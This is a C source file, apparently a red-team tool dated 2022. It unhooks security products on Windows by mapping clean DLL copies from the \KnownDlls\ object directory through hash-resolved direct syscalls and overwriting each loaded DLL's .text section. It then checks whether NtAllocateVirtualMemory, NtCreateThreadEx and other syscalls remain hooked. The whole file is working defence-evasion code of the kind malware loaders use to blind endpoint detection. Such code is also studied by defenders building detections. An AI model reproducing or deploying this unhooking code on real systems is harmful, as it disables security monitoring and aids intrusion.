/*
	ORCA   9/24/2022
	- Program That loops Through All The Loaded Dlls
	- Check If Found In \KnownDlls\ Dir
	- Replace it's .txt Section 
*/

#include <Windows.h>

#include "Structs.h"
#include "Helper.h"
#include "Syscalls.h"
#pragma comment (lib, "Syscalls.lib")

#pragma comment(linker,"/ENTRY:main")



//-----------------------------------------------------------------------------------------------------------------------------------------------------------------//

LPVOID GetDllFromKnownDll(PWSTR DllName){
	
	PVOID pModule = NULL;
	HANDLE hSection = INVALID_HANDLE_VALUE;
	UNICODE_STRING UniStr;
	OBJECT_ATTRIBUTES ObjAtr;
	NTSTATUS STATUS;

	WCHAR FullName[MAX_PATH];
	WCHAR Buf[MAX_PATH] = { L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\' };

	_strcpy(FullName, Buf);
	_strcat(FullName, DllName);
	_RtlInitUnicodeString(&UniStr, FullName);

	InitializeObjectAttributes(
		&ObjAtr,
		&UniStr,
		0x40L,
		NULL,
		NULL
	);


	hSection = NtOpenSection(SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjAtr, &STATUS);
	if (!NT_SUCCESS(STATUS) || hSection == INVALID_HANDLE_VALUE) {
		PRINT(L"\t[!] %s : NtOpenSection Failed : 0x%0.8X [THAT'S PROB OK]\n", FullName, STATUS);
		return NULL;
	}


	pModule = NtMapViewOfSection(hSection, NULL, NULL, NULL, PAGE_READONLY, &STATUS);
	if (!NT_SUCCESS(STATUS)) {
		PRINT(L"\t[!] %s : NtMapViewOfSection Failed : 0x%0.8X (main.c:52)\n", FullName, STATUS);
		return NULL;
	}


	return pModule;
}



BOOL RefreshAllDlls() {

#if _WIN64								
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32							
	PPEB pPeb = (PPEB)(__readfsdword(0x30));
#else									
	PPEB pPeb = NULL;
#endif

	if (pPeb == NULL || (pPeb != NULL && pPeb->OSMajorVersion != 0xA)) {
		return FALSE;
	}
	
	PLIST_ENTRY Head = NULL, Next = NULL;

	NTSTATUS	STATUS				= NULL;
	LPVOID		KnownDllDllModule	= NULL, CurrentDllModule = NULL;
	PVOID		pLocalTxtAddress	= NULL, pRemoteTxtAddress = NULL;
	SIZE_T		sLocalTxtSize		= NULL;
	DWORD		dwOldPermission		= NULL;
	

	Head = &pPeb->Ldr->InMemoryOrderModuleList;
	Next = Head->Flink;

	// loop through all dlls:
	while (Next != Head) {

		// getting the dll name:
		PLDR_DATA_TABLE_ENTRY	pLdrData	= (PLDR_DATA_TABLE_ENTRY)((PBYTE)Next - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
		PUNICODE_STRING			DllName		= (PUNICODE_STRING)((PBYTE)&pLdrData->FullDllName + sizeof(UNICODE_STRING));

		// getting it's pointer from \KnownDlls\ in case it returned null, that's ok, cz the dll may not be in KnownDlls after all ...
		KnownDllDllModule = GetDllFromKnownDll(DllName->Buffer);
		CurrentDllModule =  (LPVOID)(pLdrData->DllBase);

		// if we had the dll mapped with a valid address from KnownDlls:
		if (KnownDllDllModule != NULL && CurrentDllModule != NULL) {
			// get the dos & nt headers of our local dll 
			PIMAGE_DOS_HEADER CurrentDllImgDosHdr = (PIMAGE_DOS_HEADER)CurrentDllModule;
			if (CurrentDllImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
				return FALSE;
			}
			PIMAGE_NT_HEADERS CurrentDllImgNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)CurrentDllModule + CurrentDllImgDosHdr->e_lfanew);
			if (CurrentDllImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
				return FALSE;
			}
			// get the address of the module's txt section & its size & calculate the knowndll txt section address 
			for (int i = 0; i < CurrentDllImgNtHdr->FileHeader.NumberOfSections; i++) {
				PIMAGE_SECTION_HEADER pImgSec = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(CurrentDllImgNtHdr) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
				if ((*(ULONG*)pImgSec->Name | 0x20202020) == 'xet.') {
					sLocalTxtSize		= pImgSec->Misc.VirtualSize;
					pLocalTxtAddress	= (PVOID)((ULONG_PTR)CurrentDllModule + pImgSec->VirtualAddress);
					pRemoteTxtAddress	= (PVOID)((ULONG_PTR)KnownDllDllModule + pImgSec->VirtualAddress);
				}
			}
			// small check here ...
			if (sLocalTxtSize == NULL || pLocalTxtAddress == NULL || pRemoteTxtAddress == NULL){
				return FALSE;
			}

			// change mmeory permissions to start patching
			dwOldPermission = NtProtectVirtualMemory(NtCurrentProcess(), pLocalTxtAddress, sLocalTxtSize, PAGE_EXECUTE_WRITECOPY, &STATUS);
			if (!NT_SUCCESS(STATUS)) {
				PRINT(L"\t[!] NtProtectVirtualMemory [1] Failed : 0x%0.8X (main.c:127)\n", STATUS);
				return FALSE;
			}


			PRINT(L"\t[i] Replacing .txt of %s ... ", DllName->Buffer);
			// do the replacement of the .text section
			_memcpy(pLocalTxtAddress, pRemoteTxtAddress, sLocalTxtSize);
			PRINT(L"[+] DONE \n");

			
			// re-fix the memory permissions to what it was
			NtProtectVirtualMemory(NtCurrentProcess(), pLocalTxtAddress, sLocalTxtSize, dwOldPermission, &STATUS);
			if (!NT_SUCCESS(STATUS)) {
				PRINT(L"\t[!] NtProtectVirtualMemory [2] Failed : 0x%0.8X (main.c:141)\n", STATUS);
				return FALSE;
			}

			// unmap the KnownDlls dll 
			NtUnmapViewOfSection(NtCurrentProcess(), KnownDllDllModule, &STATUS);
			if (!NT_SUCCESS(STATUS)) {
				PRINT(L"\t[!] NtUnmapViewOfSection  Failed : 0x%0.8X (main.c:148)\n", STATUS);
				return FALSE;
			}

		}

		// continue to the next dll ...
		Next = Next->Flink;

	}


	return TRUE;
}

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------//


BOOL CheckIfSyscallIsHooked(ULONG_PTR SyscallAddress) {
	if (*(ULONG*)SyscallAddress != 0xb8d18b4c) {
		return TRUE;
	}
	return FALSE;
}


VOID PrintState(const wchar_t* Syscall, PVOID pSyscall) {
	PRINT(L"[#] %s [ 0x%p ] ---> %s \n", Syscall, pSyscall, CheckIfSyscallIsHooked(pSyscall) == TRUE ? L"[ HOOKED ]" : L"[ UNHOOKED ]");
}



#ifdef WAIT
BOOL Exit = FALSE;

VOID WINAPI ExitFunc(DWORD id){
	Exit = TRUE;
	return;
}
#endif

int main() {

	// getting the syscalls needed to do the job | ( Syscallslib repo )
	HashStruct SyscallHashStruct = {

	.NtAllocateVirtualMemory_Hash = NtAllocateVirtualMemory_StrHashed,
	.NtProtectVirtualMemory_Hash = NtProtectVirtualMemory_StrHashed,
	.NtCreateSection_Hash = NtCreateSection_StrHashed,
	.NtOpenSection_Hash = NtOpenSection_StrHashed,
	.NtMapViewOfSection_Hash = NtMapViewOfSection_StrHashed,
	.NtUnmapViewOfSection_Hash = NtUnmapViewOfSection_StrHashed,
	.NtClose_Hash = NtClose_StrHashed,

	};


	if (!InitializeStruct(0x07, &SyscallHashStruct)) {
		PRINT(L"[!] Failed To Fill Up The Direct Syscalls Hash Struct (main:207) \n");
		return -1;
	}




	PVOID pNtAllocateVirtualMemory = GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtAllocateVirtualMemory");

	PVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtCreateThreadEx");

	PVOID pNtProtectVirtualMemory = GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtProtectVirtualMemory");

	PVOID pNtMapViewOfSection = GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtMapViewOfSection");



	PrintState(L"NtAllocateVirtualMemory", pNtAllocateVirtualMemory);
	
	PrintState(L"NtCreateThreadEx", pNtCreateThreadEx);

	PrintState(L"NtProtectVirtualMemory", pNtProtectVirtualMemory);

	PrintState(L"NtMapViewOfSection", pNtMapViewOfSection);
	


	if (!RefreshAllDlls()) {
		PRINT(L"[!] Failed To Refresh Loaded Dlls (main.c:235) \n");
		return -1;
	}



	PrintState(L"NtAllocateVirtualMemory", pNtAllocateVirtualMemory);

	PrintState(L"NtCreateThreadEx", pNtCreateThreadEx);

	PrintState(L"NtProtectVirtualMemory", pNtProtectVirtualMemory);

	PrintState(L"NtMapViewOfSection", pNtMapViewOfSection);

	

#ifdef WAIT
	// i mean in case u wanted to do some debugging ? :)
	PRINT(L"[i] Hit <Ctrl-C> To Quit ... \n");
	SetConsoleCtrlHandler(ExitFunc, TRUE);
	while (!Exit) {
		Sleep(500);
	}
#endif // WAIT

	

	return 0;
}
